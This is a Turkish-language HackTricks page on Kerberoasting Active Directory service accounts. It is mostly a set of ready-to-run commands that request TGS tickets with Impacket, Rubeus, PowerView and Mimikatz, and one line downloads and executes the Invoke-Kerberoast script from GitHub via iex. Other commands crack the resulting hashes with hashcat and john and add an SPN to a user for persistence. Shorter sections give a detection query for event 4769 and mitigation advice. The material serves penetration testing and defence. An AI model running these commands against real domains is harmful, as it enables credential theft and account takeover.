# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatik iş akışlarını** kolayca oluşturun ve **otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Sıfırdan kahraman olana kadar AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [Discord grubuna](https://discord.gg/hRep4RUj7f) katılın veya [telegram grubuna](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

## Kerberoast

Kerberoast, özellikle **Active Directory (AD)** içinde **kullanıcı hesapları** altında çalışan hizmetlerle ilgili **TGS biletlerinin** elde edilmesine odaklanır, **bilgisayar hesaplarını** hariç tutar. Bu biletlerin şifrelemesi, **kullanıcı şifrelerinden** kaynaklanan anahtarlar kullanır ve **çevrimdışı kimlik bilgilerinin kırılma** olasılığı sağlar. Bir hizmetin bir kullanıcı hesabı olarak kullanılması, boş olmayan bir **"ServicePrincipalName"** özelliği ile belirtilir.

**Kerberoast**'i yürütmek için **TGS biletleri** isteyebilen bir etki alanı hesabı gereklidir; ancak, bu süreç **özel ayrıcalıklar** gerektirmez, bu nedenle **geçerli etki alanı kimlik bilgilerine** sahip herkes tarafından erişilebilir.

### Ana Noktalar:

* **Kerberoast**, **AD** içindeki **kullanıcı hesabı hizmetleri** için **TGS biletlerini** hedefler.
* **Kullanıcı şifrelerinden** kaynaklanan anahtarlarla şifrelenen biletler **çevrimdışı kırılabilir**.
* Bir hizmet, boş olmayan bir **ServicePrincipalName** ile tanımlanır.
* Sadece **geçerli etki alanı kimlik bilgileri** gereklidir, **özel ayrıcalıklar** gerekmez.

### **Saldırı**

{% hint style="warning" %}
**Kerberoast araçları** genellikle saldırıyı gerçekleştirirken ve TGS-REQ isteklerini başlatırken **`RC4 şifrelemesi`** istemektedir. Bu, **RC4'ün** diğer şifreleme algoritmaları olan AES-128 ve AES-256'dan **daha zayıf** olması ve Hashcat gibi araçlarla **çevrimdışı kırılmasının** daha kolay olması nedeniyledir.\
RC4 (tip 23) hash'leri **`$krb5tgs$23$*`** ile başlarken, AES-256 (tip 18) **`$krb5tgs$18$*`** ile başlar.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Çok özellikli araçlar, kerberoast edilebilir kullanıcıların bir dökümünü içerir:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Kerberoast edilebilir kullanıcıları sırala**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Teknik 1: TGS isteyin ve bellekten dökün**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Teknik 2: Otomatik araçlar**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Bir TGS istendiğinde, Windows etkinliği `4769 - Bir Kerberos hizmet bileti istendi` oluşturulur.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) kullanarak dünyanın en gelişmiş topluluk araçlarıyla desteklenen **otomatikleştirilmiş iş akışları** oluşturun ve yönetin.\
Hemen Erişim Sağlayın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

### Kırma
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Kalıcılık

Eğer bir kullanıcı üzerinde yeterli **izinlere** sahipseniz, onu **kerberoast edilebilir** hale getirebilirsiniz:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
İşte **kerberoast** saldırıları için yararlı **araçlar**: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

Eğer Linux'tan bu **hata** ile karşılaşırsanız: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** bu, yerel saatinizden kaynaklanır, ana bilgisayarı DC ile senkronize etmeniz gerekir. Birkaç seçenek bulunmaktadır:

* `ntpdate <DC'nin IP'si>` - Ubuntu 16.04'ten itibaren kullanım dışı
* `rdate -n <DC'nin IP'si>`

### Hafifletme

Kerberoasting, sömürülebilirse yüksek derecede gizlilikle gerçekleştirilebilir. Bu etkinliği tespit etmek için dikkat edilmesi gereken şey, bir Kerberos bileti istendiğini belirten **Güvenlik Olay Kimliği 4769**'a odaklanmaktır. Ancak, bu olayın yüksek sıklığı nedeniyle, şüpheli etkinlikleri izole etmek için belirli filtreler uygulanmalıdır:

* Hizmet adı **krbtgt** olmamalıdır, çünkü bu normal bir istektir.
* **$** ile biten hizmet adları, servisler için kullanılan makine hesaplarını içermemek için hariç tutulmalıdır.
* Makinelerden gelen istekler, **makine@domain** biçimindeki hesap adlarını hariç tutarak filtrelenmelidir.
* Yalnızca başarılı bilet istekleri dikkate alınmalıdır, başarısızlık kodu **'0x0'** ile belirlenir.
* **En önemlisi**, bilet şifreleme türü **0x17** olmalıdır, bu genellikle Kerberoasting saldırılarında kullanılır.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Kerberoasting riskini azaltmak için:

- **Hizmet Hesabı Şifrelerinin tahmin edilmesi zor olacak şekilde** olmasını sağlayın, en az **25 karakter** uzunluğunu önerin.
- **Yönetilen Hizmet Hesapları** kullanın, otomatik şifre değişiklikleri ve yetkilendirilmiş Hizmet Başlığı Adı (SPN) Yönetimi gibi faydalar sunarak bu tür saldırılara karşı güvenliği artırın.

Bu önlemleri uygulayarak, kuruluşlar Kerberoasting ile ilişkilendirilen riski önemli ölçüde azaltabilirler.

## Alan hesabı olmadan Kerberoast

**Eylül 2022**'de, bir araştırmacı olan Charlie Clark tarafından bir sistemi sömürmek için yeni bir yol [exploit.ph](https://exploit.ph/) platformu aracılığıyla gün yüzüne çıkarıldı. Bu yöntem, herhangi bir Active Directory hesabı üzerinde kontrol gerektirmeyen bir şekilde **Hizmet Biletleri (ST)** elde etmeyi sağlar. Temelde, bir pre-authentication gerektirmeyen bir şekilde yapılandırılmış bir başlık varsa - siber güvenlik alanında bilinen bir senaryo olan **AS-REP Roasting saldırısı** gibi bir senaryo - bu özellik, isteğin işlenmesini manipüle etmek için kullanılabilir. Özellikle, isteğin gövdesindeki **sname** özniteliğini değiştirerek, sistem, standart şifrelenmiş Bilet Verme Bileti (TGT) yerine bir **ST** vermesi için aldatılır.

Teknik ayrıntılar bu makalede açıklanmıştır: [Semperis blog yazısı](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Bu teknik kullanılarak LDAP sorgulamak için geçerli bir hesabımız olmadığından, bir kullanıcı listesi sağlamanız gerekmektedir.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139): 

#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Referanslar

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'da **takip edin**.
* **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçlarıyla desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
